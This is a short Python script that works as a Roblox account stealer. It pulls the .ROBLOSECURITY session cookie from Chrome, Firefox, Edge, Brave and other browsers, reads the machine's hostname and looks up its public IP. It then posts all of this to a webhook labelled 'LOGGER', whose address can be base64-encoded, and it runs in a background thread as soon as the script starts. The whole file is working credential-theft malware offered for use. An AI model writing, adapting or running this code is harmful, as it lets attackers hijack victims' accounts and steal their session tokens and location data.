hook = "webhook" 

import os
import base64
import browser_cookie3
import requests
from threading import Thread

try:
    weok = base64.b64decode(hook)
except:
    weok = hook


def main():
    
    hostname = os.getenv('COMPUTERNAME')
    IPAddr = requests.get("http://ipinfo.io/json").json()['ip']
    listofcookies = []
    
    browsers  = [
		browser_cookie3.chrome,
		browser_cookie3.firefox,
		browser_cookie3.edge,
		browser_cookie3.opera,
		browser_cookie3.Chromium,
		browser_cookie3.Brave,
		browser_cookie3.Vivaldi,
		browser_cookie3.Safari
    ]
    
    for browser in browsers:
        try:
            cookies = browser(domain_name='roblox.com')
            cookies = str(cookies)
            cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            listofcookies.append(cookie)
        except:pass
    for i in listofcookies:
        try:
            r = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": i})
            requests.post(weok,json={'username':'LOGGER', 'content':f'```Hostname: {hostname}\nIP: {IPAddr}\nCookie:\n {i}```'})
        except:pass

Thread(target = main).start()
